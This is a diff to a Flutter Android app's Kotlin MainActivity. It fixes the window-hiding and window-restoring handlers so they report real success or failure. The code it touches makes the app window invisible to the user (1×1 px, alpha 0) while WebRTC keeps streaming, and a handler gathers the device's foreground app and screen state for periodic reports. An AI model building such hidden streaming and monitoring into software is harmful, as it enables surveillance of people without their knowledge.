@@ -124,7 +124,9 @@ class MainActivity : FlutterActivity() {
                     // ลดขนาด window เหลือ 1×1 px + alpha 0 → user มองไม่เห็น
                     // FlutterEngine ยังรันต่อใน background, WebRTC ยังส่งสตรีม
                     // ป้องกัน UI flash ระหว่าง launch → minimize
+                    // D6: post + reply success/false หลัง lambda จริง ๆ ทำงานเสร็จ
                     runOnUiThread {
+                        var ok = false
                         try {
                             val lp = window.attributes
                             lp.width = 1
@@ -138,15 +140,17 @@ class MainActivity : FlutterActivity() {
                                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                             window.attributes = lp
+                            ok = true
                         } catch (e: Exception) {
                             Log.w(TAG, "makeWindowInvisible failed: ${e.message}")
                         }
+                        result.success(ok)
                     }
-                    result.success(true)
                 }
                 "restoreWindow" -> {
                     // คืน window ขนาดปกติ (สำหรับ factory-reset / user เปิด UI ใหม่)
                     runOnUiThread {
+                        var ok = false
                         try {
                             val lp = window.attributes
                             lp.width = WindowManager.LayoutParams.MATCH_PARENT
@@ -159,11 +163,12 @@ class MainActivity : FlutterActivity() {
                                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv() and
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE.inv()
                             window.attributes = lp
+                            ok = true
                         } catch (e: Exception) {
                             Log.w(TAG, "restoreWindow failed: ${e.message}")
                         }
+                        result.success(ok)
                     }
-                    result.success(true)
                 }
                 "readDeviceStatus" -> {
                     // อ่าน battery/network/foreground app/screen — ใช้ใน periodic reporter
